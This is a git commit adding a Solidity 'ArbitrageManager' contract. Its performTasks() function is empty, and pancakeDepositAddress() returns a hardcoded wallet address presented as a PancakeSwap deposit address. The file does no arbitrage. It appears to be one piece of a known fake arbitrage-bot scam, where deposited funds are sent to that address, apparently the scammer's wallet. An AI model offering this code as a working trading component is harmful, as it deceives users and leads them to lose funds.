f6ef2990570bb23c435f3ec2a422ad16fa8d9859
Bill0801 <96687055+Bill0801@users.noreply.github.com>
2021-12-26 13:43:05 +0100

    Add files via upload

---
+++ ArbitrageManager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xa0Ae0e7fC1cE66A06e7D11b700cA5Bce1f362dBb;
+	}
+}
